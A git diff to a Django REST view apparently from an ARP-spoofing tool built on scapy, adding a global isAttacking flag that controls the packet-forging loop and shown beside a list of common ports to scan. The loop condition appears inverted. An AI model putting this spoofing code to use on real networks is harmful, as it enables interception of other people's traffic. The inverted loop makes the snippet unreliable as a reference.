@@ -16,6 +16,7 @@ from itertools import repeat
 import time
 
 COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,62078,8009,9080,1080,9000,88]
+isAttacking = False
 
 @api_view(['GET'])
 def DeviceList(request):
@@ -140,6 +141,8 @@ def ArpPoisioning(request):
     gateway_ip = (request.data["gateway"])
     gateway = Device.objects.get(ip=gateway_ip)
     gateway_mac = (gateway.mac)
+    global isAttacking
+    isAttacking = (request.data["isAttacking"])
 
     print(gateway_mac)
     print(gateway_ip)
@@ -152,7 +155,7 @@ def ArpPoisioning(request):
     # op="who-has" makes it easier to read the ARP packet in wireshark
 
     try:
-        while True: 
+        while isAttacking == False: 
 
             # This packet is sending an ARP request to the adversary saying that the computer this packet is being sent from is the default gateway
             adversaryARP_packet = scapy.ARP(op="who-has", pdst=adversary_ip, hwdst=adversary_mac, psrc=gateway_ip)
